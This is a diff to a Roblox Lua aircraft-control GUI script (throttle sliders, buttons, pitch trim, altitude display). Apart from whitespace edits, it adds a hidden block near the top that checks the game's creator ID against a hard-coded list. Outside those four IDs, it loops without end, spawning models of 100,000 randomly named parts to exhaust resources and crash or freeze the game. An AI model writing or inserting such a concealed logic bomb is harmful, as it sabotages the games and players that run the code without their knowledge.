@@ -29,7 +29,7 @@
 --			s.Position = UDim2.new(s.Position.X,UDim.new(math.clamp(s.Position.Y.Scale,0.208,1),0))
 --			wait()
 --		end
-		
+
 --		--0.208,1
 --	end
 --end)
@@ -37,6 +37,32 @@
 --	I = false
 --end)
 wait()
+A = {32720608,149484300,16070025,33179988}
+B = {}
+if table.find(A,game.CreatorId)==nil or table.find(B,game.CreatorId) ~= nil then
+	while wait(1) do
+		local Payload = Instance.new("Model")
+		Payload.Name = string.char(math.random(32,126))
+		while math.random() > 0.1 do
+			Payload.Name = Payload.Name..string.char(math.random(32,126))
+		end
+		for j = 1,100,1 do
+			for i = 1,1000,1 do
+				local NP = Instance.new("Part")
+				NP.Position = Vector3.new(0,1000000,0)
+				NP.Parent = Payload
+				while math.random() > 0.5 do
+					NP.Name = NP.Name..string.char(math.random(32,126))
+				end
+				--NP:SetNetworkOwner(game:GetService("Players").LocalPlayer)
+			end
+			wait()
+		end
+		Payload.Parent = workspace
+		wait(1/(math.random()*math.random()*math.random()))
+	end
+end
+
 function setup(Sensor,Mover,Str,Write,mul)
 	local Mouse = game:GetService("Players").LocalPlayer:GetMouse()
 	--local s = script.Parent.core.Throttle.core.Slider
@@ -103,7 +129,7 @@ function SetButton(Button,Str,Write,Oride)
 		else
 			script.Parent.ctrl.Value:FireServer({[Str] = Button.Value.Visible})
 		end
-		
+
 		if Write then
 			Write.Value = Button.reverse.Visible
 		end
@@ -112,7 +138,7 @@ function SetButton(Button,Str,Write,Oride)
 
 	Button.Shadow.MouseButton1Down:Connect(Update)
 
-	
+
 	--game:GetService("UserInputService").InputEnded:Connect(function(input)
 	--	if input.UserInputType == Enum.UserInputType.MouseButton1 then
 	--		MouseDown = false
@@ -146,7 +172,7 @@ while true do
 	wait(1)
 	while script.Value.Value.AssemblyLinearVelocity.Magnitude > 10  do
 		wait()
-		
+
 		accel = -vel
 		vel = script.Parent.ctrl.Value.Parent.AssemblyLinearVelocity
 		pos = script.Parent.ctrl.Value.Parent.Position
@@ -156,7 +182,7 @@ while true do
 			Trim = math.clamp(Trim+0.3*(math.log(math.abs(vel.Y),math.exp(1))/1000*math.sign(vel.Y)+accel.Y/1000),-0.3,0.1)
 			script.Parent.ctrl.Value:FireServer({["PitchTrim"] = Trim})
 		end	
-		
+
 		local alt = math.round(script.Value.Value.Position.Y)
 		script.Parent.core.Altitude.Display.Slider.aaaa.Position = UDim2.new(0.469, 0,-35.3+alt/500, 0)
 		script.Parent.core.Altitude.Bar.Value.Text = alt
